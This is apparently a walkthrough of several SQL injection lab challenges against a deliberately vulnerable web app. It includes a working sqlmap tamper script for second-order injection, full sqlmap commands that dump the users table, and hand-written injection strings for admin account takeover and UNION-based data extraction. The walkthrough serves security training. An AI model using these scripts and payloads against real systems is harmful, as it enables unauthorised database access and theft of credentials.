<pre><div><div><div><span>#!/usr/bin/python</span></div><div><span>import</span> requests</div><div><span>from</span> lib<span>.</span>core<span>.</span>enums <span>import</span> <span>PRIORITY</span></div><div>__priority__ <span>=</span> <span>PRIORITY</span><span>.</span><span>NORMAL</span></div><div><br/></div><div>address <span>=</span> <span>"</span><span>http://10.10.1.134:5000/challenge4</span><span>"</span></div><div>password <span>=</span> <span>"</span><span>asd</span><span>"</span></div><br/><div><span>def</span> <span>dependencies</span><span>():</span></div><div>    <span>pass</span></div><br/><div><span>def</span> <span>create_account</span><span>(</span><span>payload</span><span>):</span></div><div>    <span>with</span> requests<span>.</span>Session<span>()</span> <span>as</span> s<span>:</span></div><div>        data <span>=</span> <span>{</span><span>"</span><span>username</span><span>"</span><span>:</span> payload<span>,</span> <span>"</span><span>password</span><span>"</span><span>:</span> password<span>}</span></div><div>        resp <span>=</span> s<span>.</span>post<span>(</span><span>f</span><span>"</span><span>{</span>address<span>}</span><span>/signup"</span><span>,</span> <span>data</span><span>=</span>data<span>)</span></div><br/><div><span>def</span> <span>login</span><span>(</span><span>payload</span><span>):</span></div><div>    <span>with</span> requests<span>.</span>Session<span>()</span> <span>as</span> s<span>:</span></div><div>        data <span>=</span> <span>{</span><span>"</span><span>username</span><span>"</span><span>:</span> payload<span>,</span> <span>"</span><span>password</span><span>"</span><span>:</span> password<span>}</span></div><div>        resp <span>=</span> s<span>.</span>post<span>(</span><span>f</span><span>"</span><span>{</span>address<span>}</span><span>/login"</span><span>,</span> <span>data</span><span>=</span>data<span>)</span></div><div>        sessid <span>=</span> s<span>.</span>cookies<span>.</span>get<span>(</span><span>"</span><span>session</span><span>"</span><span>,</span> <span>None</span><span>)</span></div><div>    <span>return</span> <span>"</span><span>session=</span><span>{}</span><span>"</span><span>.</span>format<span>(</span>sessid<span>)</span></div><br/><br/><div><span>def</span> <span>tamper</span><span>(</span><span>payload</span><span>,</span> <span>**</span><span>kwargs</span><span>):</span></div><div>    headers <span>=</span> kwargs<span>.</span>get<span>(</span><span>"</span><span>headers</span><span>"</span><span>,</span> <span>{})</span></div><div>    create_account<span>(</span>payload<span>)</span></div><div>    headers<span>[</span><span>"</span><span>Cookie</span><span>"</span><span>]</span> <span>=</span> login<span>(</span>payload<span>)</span></div><div>    <span>return</span> payload</div><br/><br/></div></div></pre>

The folder where the tamper script is located will also need an empty *__init__.py*
file for sqlmap to be able to load it. Before starting sqlmap with the
tamper script, change the address and password variable inside the
script. With this done, it is possible to exploit the vulnerability with
the following command:

<pre><div><div>sqlmap <span>--</span>tamper so<span>-</span>tamper<span>.</span>py <span>--</span>url http<span>://</span><span>10.10</span><span>.</span>1<span>.</span>134<span>:</span><span>5000</span><span>/</span>challenge4<span>/</span>signup  <span>--</span>data <span>"</span><span>username=admin&password=asd</span><span>"</span> </div><div><span>--</span>second<span>-</span>url http<span>://</span><span>10.10</span><span>.</span>1<span>.</span>134<span>:</span><span>5000</span><span>/</span>challenge4<span>/</span>notes  <span>-</span>p username <span>--</span>dbms sqlite <span>--</span>technique<span>=</span>U <span>--</span>no<span>-</span>cast</div><br/><div><span># --tamper so-tamper.py - The tamper script</span></div><div><span># --url - The URL of the injection point, which is /signup in this case</span></div><div><span># --data - The POST data from the registraion form to /signup. </span></div><div><span>#   Password must be the same as the password in the tamper script</span></div><div><span># --second-url http://10.10.1.134:5000/challenge4/notes - Visit this URL to check for results</span></div><div><span># -p username - The parameter to inject to</span></div><div><span># --dbms sqlite - To speed things up</span></div><div><span># --technique=U - The technique to use. [U]nion-based</span></div><div><span># --no-cast - Turn off payload casting mechanism</span></div></div>
</pre>

Dumping the *users* table might be hard without turning off the payload casting mechanism with the *--no-cast* parameter. An example of the difference between casting and no casting can be seen here:

<pre><div><div><div><span>--</span> With casting enabled<span>:</span></div><div><span>admin</span><span>'</span> union <span>all</span> select <span>min</span><span>(</span>cast<span>(</span>x<span>'</span><span>717a717071</span><span>'</span> <span>as</span> text<span>)</span><span>||</span>coalesce<span>(</span>cast<span>(</span>sql <span>as</span> text<span>),</span>cast<span>(</span>x<span>'</span><span>20</span><span>'</span> <span>as</span> text<span>)))</span><span>||</span>cast<span>(</span>x<span>'</span><span>716b786271</span><span>'</span> <span>as</span> text<span>),</span>null <span>from</span> sqlite_master </div><div>where tbl_name<span>=</span>cast<span>(</span>x<span>'</span><span>7573657273</span><span>'</span> <span>as</span> text<span>)</span><span>--</span> daqo<span>'</span></div><div><span>--</span> <span>7573657273</span> <span>is</span> <span>'</span><span>users</span><span>'</span> <span>in</span> <span>ascii</span></div><br/><div><span>--</span> Without casting<span>:</span></div><div><span>admin</span><span>'</span> union <span>all</span> select cast<span>(</span>x<span>'</span><span>717a6a7871</span><span>'</span> <span>as</span> text<span>)</span><span>||</span><span>id</span><span>||</span>cast<span>(</span>x<span>'</span><span>6774697a7462</span><span>'</span> <span>as</span> text<span>)</span><span>||</span>password<span>||</span>cast<span>(</span>x<span>'</span><span>6774697a7462</span><span>'</span> <span>as</span> text<span>)</span><span>||</span>username<span>||</span>cast<span>(</span>x<span>'</span><span>7162706b71</span><span>'</span> <span>as</span> text<span>),</span>null </div><div><span>from</span> users<span>--</span> ypfr<span>'</span></div></div></div>
</pre>

When sqlmap asks, answer no to follow 302 redirects, then answer yes
to continue further testing if it detects some WAF/IPS. Answer no when
asked if you want to merge cookies in future requests, and say no to
reduce the number of requests. As seen in the image below, sqlmap was
able to find the vulnerability, which allows us to automate the
exploitation of it.

![](https://i.imgur.com/ernTceT.png)

The flag can then be found by dumping the *users* table:

<pre><div><div>sqlmap <span>--</span>tamper tamper<span>/</span>so<span>-</span>tamper<span>.</span>py <span>--</span>url http<span>://</span><span>10.10</span><span>.</span>1<span>.</span>134<span>:</span><span>5000</span><span>/</span>challenge4<span>/</span>signup <span>--</span>data <span>"</span><span>username=admin&password=asd</span><span>"</span> </div><div><span>--</span>second<span>-</span>url http<span>://</span><span>10.10</span><span>.</span>1<span>.</span>134<span>:</span><span>5000</span><span>/</span>challenge4<span>/</span>notes <span>-</span>p username <span>--</span>dbms<span>=</span>sqlite <span>--</span>technique<span>=</span>U <span>--</span>no<span>-</span>cast <span>-</span>T users <span>--</span>dump</div></div></pre>

Sqlmap is quite noisy and will add a lot of users attempting to
exploit this application. Because of this, the output will be trimmed
and the message below can be seen.

<pre><div><span>[</span><span>WARNING</span><span>]</span> console output will be trimmed to last <span>256</span> rows due to large table size</div></pre>

However, all the data is saved and written to a dump file, as seen in
the image below. Read the top of the dump file to get the flag:

![](https://i.imgur.com/9DSH7Aq.png)

**NB: ** The flag will differ on the live system.

### Task

Exploit the vulnerable function and retrieve the flag.

## vulnerable startup change password


### Goal

For this
challenge, the vulnerability on the note page has been fixed. A new
change password function has been added to the application, so the users
can now change their password by navigating to the Profile page. The
new function is vulnerable to SQL injection because the UPDATE statement
concatenates the username directly into the SQL query, as can be seen
below. The goal here is to exploit the vulnerable function to gain
access to the admin's account.

### Description

The developer has used a placeholder for the password parameter
because this input comes directly from the user. The username does not
come directly from the user but is rather fetched from the database
based on the user id stored in the session object. Therefore, the
developer has thought that the username was safe to use and concatenated
it directly into the query instead of using a placeholder:

<pre><div><span>UPDATE</span> users <span>SET</span> password <span>=</span> <span>?</span> <span>WHERE</span> username <span>=</span> <span>'</span><span>" + username + "</span><span>'</span></div></pre>

To exploit this vulnerability and gain access to the admin's user account, we can create a user with the name `admin'-- -`.

After
having registered the malicious user, we can update the password for
our new user to trigger the vulnerability. When changing the password,
the application executes two queries. First, it asks the database for
the username and password for our current user:

<pre><div><div><span>SELECT</span> username<span>,</span> password <span>FROM</span> users <span>WHERE</span> <span>id</span> <span>=</span> <span>?</span></div></div></pre>

If all checks are fine, it will try to update the password for our
user. Since the username gets concatenated directly into the SQL query,
the executed query will look as follows:

<pre><div><span>UPDATE</span> users <span>SET</span> password <span>=</span> <span>?</span> <span>WHERE</span> username <span>=</span> <span>'</span><span>admin</span><span>'</span> <span>--</span> <span>-</span><span>'</span></div></pre>

This means that instead of updating the password for `admin' -- -`, the application updated the password for the *admin* user. After having updated the password, it is possible to log in as admin with the new password and view the flag.

### Task

Create a new user and exploit the vulnerability in the update password function to access the admin account to get the flag.

## vulnerable startup book title


### Goal

A new
function has been added to the page, and it is now possible to search
books in the database. The new search function is vulnerable to SQL
injection because it concatenates the user input directly into the SQL
statement. The goal of the task is to abuse this vulnerability to find
the hidden flag.

### Description

When the user first logs into the challenge, they are presented with a message saying:

```
Testing a new function to search for books, check it out here
```

The 'here' text is a link taking the user to [http://MACHINE_IP:5000/challenge6/book?title=test](http://MACHINE_IP:5000/challenge6/book?title=test), which is the page containing the vulnerable search function and can be seen here:

![](https://i.imgur.com/6Lhz4Wu.png)

The web page performs a GET request with the parameter `title` when searching for a book. The query it performs can be seen here:

<pre><div><span>SELECT</span> <span>*</span> <span>from</span> books <span>WHERE</span> <span>id</span> <span>=</span> <span>(</span><span>SELECT</span> <span>id</span> <span>FROM</span> books <span>WHERE</span> title like <span>'</span><span>" + title + "%</span><span>'</span><span>)</span></div></pre>

All we need to do to abuse this is closing the LIKE operand to the
right of the LIKE operator. For example, we can dump all the books in
the database by injecting the following command:

<pre><div><span>'</span>) <span>or</span> <span>1</span><span>=</span><span>1</span><span>-- -</span></div></pre>

### Task

Use what you learned about UNION-based SQL injection and exploit the vulnerable book search function to retrieve the flag.

## Vulnerable startup book title 2


### Goal

In this
challenge, the application performs a query early in the process. It
then uses the result from the first query in the second query later
without sanitization. Both queries are vulnerable, and the first query
can be exploited through blind SQL injection. However, since the second
query is also vulnerable, it is possible to simplify the exploitation
and use UNION based injection instead of Boolean-based blind injection;
making the exploitation easier and less noisy. The goal of the task is
to abuse this vulnerability without using blind SQL injection and
retrieve the flag.

### Description

When the user first logs into the challenge, they are presented with a message saying:

```
Testing a new function to search for books, check it out here
```

The 'here' text is a link taking the user to  [http://MACHINE_IP:5000/challenge7/book?title=test](http://MACHINE_IP:5000/challenge7/book?title=test), which is the page containing the vulnerable search function and can be seen here:

![](https://i.imgur.com/ses5Q90.png)

When
searching for a book title, the web page performs a GET request. The
application then performs two queries where the first query gets the
book's ID, then later on in the process, a new SQL query is performed to
get all information about the book. The two queries can be seen here:

<pre><div><div>bid <span>=</span> db<span>.</span>sql_query<span>(</span><span>f</span><span>"SELECT id FROM books WHERE title like '</span><span>{</span>title<span>}</span><span>%'"</span><span>,</span> <span>one</span><span>=</span><span>True</span><span>)</span></div><div><span>if</span> bid<span>:</span></div><div>    query <span>=</span> <span>f</span><span>"SELECT * FROM books WHERE id = '</span><span>{</span>bid<span>[</span><span>'</span><span>id</span><span>'</span><span>]</span><span>}</span><span>'"</span></div></div></pre>

First, we will limit the result to zero rows, which can be done by
not giving it any input or input we know does not exist. Then we can use
the UNION clause to control what the first query returns, which is the
data that will be used in the second query. Meaning that we can inject
the following value into the search field:

<pre><div>' union select <span>'</span><span>STRING</span></div></pre>

After injecting the code above, the application will perform the following SQL queries:

![](https://i.imgur.com/Mm3NbCp.png)

From queries, we can see that the result from query one is STRING%, which is used in the WHERE clause of the second query.

If
we replace 'STRING with a number that exists in the database, the
application should return a valid object. However, the application adds a
wildcard (%) to the string, meaning that we must comment out the
wildcard first. The wildcard can be commented out by appending '-- - to
the end of the string we are injecting. For example, if we inject the
following line:

<pre><div>' union select <span>'</span><span>1</span><span>'</span><span>-- -</span></div></pre>

The application should display the book with ID 1 back to the user, as seen here:

![](https://i.imgur.com/3FSVjII.png)

If
we did not limit the result to zero rows first, we would not have
gotten the output of the UNION statement but rather the content from the
LIKE clause. For example, by injecting the following string:

<pre><div>test<span>'</span> union select <span>'</span><span>1</span><span>'</span><span>-- -</span></div></pre>

The application would have executed the following queries:.

![](https://i.imgur.com/2EaUJyM.png)

Now
that we have full control of the second query, we can use UNION-based
SQL injection to extract data from the database. The goal is to make the
second query look something similar to the following query:

<pre><div><span>SELECT</span> <span>*</span> <span>FROM</span> books <span>WHERE</span> <span>id</span> <span>=</span> <span>''</span> union select <span>1</span><span>,</span><span>2</span><span>,</span><span>3</span><span>,</span><span>4</span><span>-- -</span></div></pre>

Making the application execute the query above should be as easy as injecting the following query:

<pre><div>' union select <span>'</span><span>1</span><span>'</span> union select <span>1</span><span>,</span><span>2</span><span>,</span><span>3</span><span>,</span><span>4</span><span>-- -</span></div></pre>

However, we are closing the string that is supposed to be returned by
appending the single quote (') before the second UNION clause. To make
the query work and return our second UNION clause, we will have to
escape the single quote. Escaping the single quote can be done by
doubling up the quote (''). After having doubled the quotes, we have the
following string:

<pre><div>' union select <span>'</span><span>-1</span><span>''</span><span>union select 1,2,3,4-- -</span></div></pre>

Injecting the string above will return the page seen here:

![](https://i.imgur.com/TT5m6D1.png)

### Task

Use what you learned about UNION-based SQL injection and exploit the vulnerable book search function to retrieve the flag.
